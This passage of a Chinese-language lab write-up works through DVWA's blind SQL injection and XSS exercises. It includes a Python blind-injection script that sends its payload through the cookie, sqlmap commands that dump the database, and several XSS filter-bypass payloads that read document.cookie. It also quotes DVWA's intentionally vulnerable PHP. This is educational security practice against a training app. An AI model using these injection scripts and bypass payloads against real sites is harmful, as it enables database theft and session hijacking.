    <span class="hljs-comment">//mysql_close(); </span>
&#125; 

<span class="hljs-meta">?&gt;</span></code></pre>

<p><strong>mysql_real_escape_string()</strong> 调用mysql库的函数 mysql_real_escape_string, 在以下字符前添加反斜杠: <code>\x00</code>, <code>\n</code>, <code>\r</code>, <code>\</code>, <code>&#39;</code>, <code>&quot;</code> 和 <code>\x1a</code>.</p>
<p>本质上跟low级别的没有太大的区别，只是将一些特殊字符转义，但是我们注入时没有用到这些字符，所以注入语句基本和low级别一样</p>
<h3 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h3><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /dvwa/vulnerabilities/sqli_blind/ HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>
<span class="hljs-attribute">Host</span>: <span class="hljs-number">10.5.8.66</span>
<span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64; rv:<span class="hljs-number">82</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">82</span>.<span class="hljs-number">0</span>
<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>
<span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span>
<span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">10.5.8.66</span>/dvwa/vulnerabilities/sqli/
<span class="hljs-attribute">Connection</span>: close
<span class="hljs-attribute">Cookie</span>: id=<span class="hljs-number">1</span>; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1
<span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span>
<span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span></code></pre>

<p>抓包后可以发现提交的参数<code>id</code>在cookie中，所以与中级别的方法不一样了，但是还是可以使用sqlmap注入。</p>
<h4 id="手工加脚本-2"><a href="#手工加脚本-2" class="headerlink" title="手工加脚本"></a>手工加脚本</h4><p>通过手工测试发现是字符型注入，与low级别的脚本大同小异，只是将注入的位置改到了cookie的位置</p>
<p><img src="https://i.loli.net/2020/11/12/I257FMGp9VNfiac.png" alt="bsqlh-3.png"></p>
<p><img src="https://i.loli.net/2020/11/12/TtyDpsOmZEfBbVe.png" alt="bsqlh-4.png"></p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
url = <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span>
t=<span class="hljs-string">&quot;&quot;</span>
flag = <span class="hljs-string">&quot;&quot;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(left &lt; right):
        <span class="hljs-comment">#payload = &quot;1&#x27; and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.format(i,mid)</span>
        payload = <span class="hljs-string">&quot;1&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
        <span class="hljs-comment">#payload = &quot;1&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid)</span>
        <span class="hljs-comment">#payload = &quot;1&#x27; and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23&quot;.format(i,mid)</span>
        <span class="hljs-built_in">id</span> = payload
        header = &#123;<span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;id=&quot;</span>+payload+<span class="hljs-string">&quot;;&quot;</span>+<span class="hljs-string">&quot;security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span>&#125;
        <span class="hljs-comment">#print(header)</span>
        response = requests.post(url,headers = header)
        t = response.text
        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;exists&quot;</span> <span class="hljs-keyword">in</span> response.text:
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
    <span class="hljs-built_in">print</span>(mid)
    <span class="hljs-comment">#print(t)</span>
    flag = flag + <span class="hljs-built_in">chr</span>(mid)
<span class="hljs-built_in">print</span>(flag)</code></pre>



<h4 id="sqlmap-2"><a href="#sqlmap-2" class="headerlink" title="sqlmap"></a>sqlmap</h4><pre><code class="hljs stylus">python2 sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> <span class="hljs-attr">--level</span> <span class="hljs-number">2</span> <span class="hljs-attr">--dbs</span> <span class="hljs-attr">--batch</span>

python2 sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> <span class="hljs-attr">--level</span> <span class="hljs-number">2</span> -D dvwa <span class="hljs-attr">--tables</span> <span class="hljs-attr">--batch</span>

python2 sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> <span class="hljs-attr">--level</span> <span class="hljs-number">2</span> -D dvwa -T flag <span class="hljs-attr">--columns</span> <span class="hljs-attr">--batch</span>

python2 sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/&quot;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;id&quot;</span>  <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1&quot;</span> <span class="hljs-attr">--level</span> <span class="hljs-number">2</span> -D dvwa -T flag -C fl4g <span class="hljs-attr">--dump</span> <span class="hljs-attr">--batch</span></code></pre>

<p><img src="https://i.loli.net/2020/11/12/jLdrQDiI9XlAZcU.png" alt="bsqlh-5.png"></p>
<h3 id="sql注入防御"><a href="#sql注入防御" class="headerlink" title="sql注入防御"></a>sql注入防御</h3><p>通过查看impossible源码发现检测了id数据类型，使用了预编译绑定id变量，有效防止SQL注入，这些可以在以后编程中应用，以编写出更加安全的代码。</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ] ) ) &#123;
    <span class="hljs-comment">// Check Anti-CSRF token</span>
    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );

    <span class="hljs-comment">// Get input</span>
    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];

    <span class="hljs-comment">// Was a number entered?</span>
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>( <span class="hljs-variable">$id</span> )) &#123;   <span class="hljs-comment">//检测提交的数据是否为数字类型</span>
        <span class="hljs-comment">// Check the database</span>
        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );<span class="hljs-comment">//预编译绑定了id变量</span>
        <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:id&#x27;</span>, <span class="hljs-variable">$id</span>, PDO::<span class="hljs-variable constant_">PARAM_INT</span> );
        <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();

        <span class="hljs-comment">// Get results</span>
        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">rowCount</span>() == <span class="hljs-number">1</span> ) &#123;
            <span class="hljs-comment">// Feedback for end user</span>
            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;
        &#125;
        <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span>
            <span class="hljs-title function_ invoke__">header</span>( <span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="hljs-string">&#x27; 404 Not Found&#x27;</span> );

            <span class="hljs-comment">// Feedback for end user</span>
            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;
        &#125;
    &#125;
&#125;

<span class="hljs-comment">// Generate Anti-CSRF token</span>
<span class="hljs-title function_ invoke__">generateSessionToken</span>();

<span class="hljs-meta">?&gt;</span></code></pre>





<h2 id="XSS-Reflected"><a href="#XSS-Reflected" class="headerlink" title="XSS (Reflected)"></a>XSS (Reflected)</h2><h3 id="low-3"><a href="#low-3" class="headerlink" title="low"></a>low</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);

<span class="hljs-comment">// Is there any input?</span>
<span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;
    <span class="hljs-comment">// Feedback for end user</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span>;
&#125;

<span class="hljs-meta">?&gt;</span></code></pre>

<p> 可以看到，代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞 。</p>
<p>先测试一下</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;xss&quot;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>

<p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/Users\Sunzh\AppData\Roaming\Typora\typora-user-images\image-20201026202557058.png" alt="image-20201026202557058"></p>
<p>获取cookie</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>

<p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/Users\Sunzh\AppData\Roaming\Typora\typora-user-images\image-20201026202647823.png" alt="image-20201026202647823"></p>
<h3 id="medium-3"><a href="#medium-3" class="headerlink" title="medium"></a>medium</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);
<span class="hljs-comment">// Is there any input?</span>
<span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;
    <span class="hljs-comment">// Get input</span>
    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );
    <span class="hljs-comment">// Feedback for end user</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>

<p>代码审计后可以发现是对输入的内容进行了过滤，将**&lt;script&gt;**替换为空，可以双写绕过，也可以大小写绕过。</p>
<p>构造payload：</p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">sCriPt</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

&lt;scr<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">ipt&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
//使用其他标签
<span class="hljs-tag">&lt;<span class="hljs-name">IMG</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(document.cookie)</span>&gt;</span></code></pre>

<p><img src="https://i.loli.net/2020/11/05/tzosymv7d1Sru3e.png" alt="xssmid.png"></p>
<h3 id="high-3"><a href="#high-3" class="headerlink" title="high"></a>high</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);
<span class="hljs-comment">// Is there any input?</span>
<span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;
    <span class="hljs-comment">// Get input</span>
    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">preg_replace</span>( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );
    <span class="hljs-comment">// Feedback for end user</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>

<p>先代码审计，执行一个正则表达式的搜索和替换,其中 <code>/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i</code> 是正则表达式 <code>(.*)</code> 表示贪婪匹配，<code> /i</code> 表示不区分大小写所以在High级别的代码中，所有关于  <code>&lt;script&gt; </code> 标签均被过滤删除了 ,可以使用其他的标签。</p>
<p>构造payload：</p>
<pre><code class="hljs routeros">&lt;IMG <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onerror</span>=alert(document.cookie)&gt;</code></pre>

<p><img src="https://i.loli.net/2020/11/05/tzosymv7d1Sru3e.png" alt="xssmid.png"></p>
<h2 id="XSS-Stored"><a href="#XSS-Stored" class="headerlink" title="XSS (Stored)"></a>XSS (Stored)</h2><h3 id="low-4"><a href="#low-4" class="headerlink" title="low"></a>low</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;
    <span class="hljs-comment">// Get input</span>
    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );
    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );

    <span class="hljs-comment">// Sanitize message input</span>
    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$message</span> );
    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));

    <span class="hljs-comment">// Sanitize name input</span>
    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));

    <span class="hljs-comment">// Update database</span>
    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;
    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );

    <span class="hljs-comment">//mysql_close();</span>
&#125;

<span class="hljs-meta">?&gt;</span></code></pre>

<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p> <code>isset() </code> 函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true&#x2F;false </p>
<p> <code>trim() </code> 函数作用为移除字符串两侧空白字符或其他预定义字符 </p>
<p> <code>stripslashes() </code> 函数用于删除字符串中的反斜杠 </p>
<p> <code>mysqli_real_escape_string() </code> 函数会对字符串中的特殊号<code>(\x00，\n，\r，\，&#39;，&quot;，\x1a) </code> 进行转义 </p>
<p> 在代码中对message，name输入框内容  没有进行XSS方面的过滤和检查 </p>
<p> 且通过  <code>query </code> 语句插入到数据库中。所以存在存储型XSS漏洞 </p>
<p>这里name ,message的输入框中都存在xss，所以两个位置都可以使用，但是name位置有字数限制，可以使用bp抓包修改</p>
<p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/Users\Sunzh\AppData\Roaming\Typora\typora-user-images\image-20201026203331497.png" alt="image-20201026203331497"></p>
<p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/Users\Sunzh\AppData\Roaming\Typora\typora-user-images\image-20201026203255791.png" alt="image-202010262032"></p>
<p>由于是存储型XSS,所以每次刷新页面都会弹出cookie。</p>
<h3 id="medium-4"><a href="#medium-4" class="headerlink" title="medium"></a>medium</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;
    <span class="hljs-comment">// Get input</span>
    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );
    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );

    <span class="hljs-comment">// Sanitize message input</span>
    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">strip_tags</span>( <span class="hljs-title function_ invoke__">addslashes</span>( <span class="hljs-variable">$message</span> ) );
    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));
    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );

    <span class="hljs-comment">// Sanitize name input</span>
    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );
    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));

    <span class="hljs-comment">// Update database</span>
    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;
    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );

    <span class="hljs-comment">//mysql_close();</span>
&#125;

<span class="hljs-meta">?&gt;</span></code></pre>

<h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><pre><code class="hljs php"><span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">strip_tags</span>( <span class="hljs-title function_ invoke__">addslashes</span>( <span class="hljs-variable">$message</span> ) );
<span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );
<span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );</code></pre>

<p> <code>strip_tags() </code> 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用 <code>&lt;b&gt;</code> 标签。 </p>
<p> <code>addslashes() </code> 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。 </p>
<p> <code>htmlspecialchars() </code> 函数把预定义的字符&amp;、”、’、&lt;、&gt;转换为 HTML 实体，防止浏览器将其作为HTML元素 </p>
<p> 对message输入内容进行检测过滤，因此无法再通过message参数注入XSS代码</p>
<p>但是对于name参数，只是简单过滤了<code>&lt;script&gt;</code>字符串，仍然存在存储型的XSS，与反射型中级的一样的方法</p>
<p>payload</p>
<pre><code class="hljs xml">使用双写绕过，输入  &lt;scr<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">ipt&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> 
使用大小写绕过，输入<span class="hljs-tag">&lt;<span class="hljs-name">sCript</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> 
输入其他标签，如  <span class="hljs-tag">&lt;<span class="hljs-name">IMG</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(document.cookie)</span>&gt;</span></code></pre>

<p><img src="https://i.loli.net/2020/11/05/CIUt6lTadZ5fEig.png" alt="xssstored2.png"></p>
<h3 id="high-4"><a href="#high-4" class="headerlink" title="high"></a>high</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;
    <span class="hljs-comment">// Get input</span>
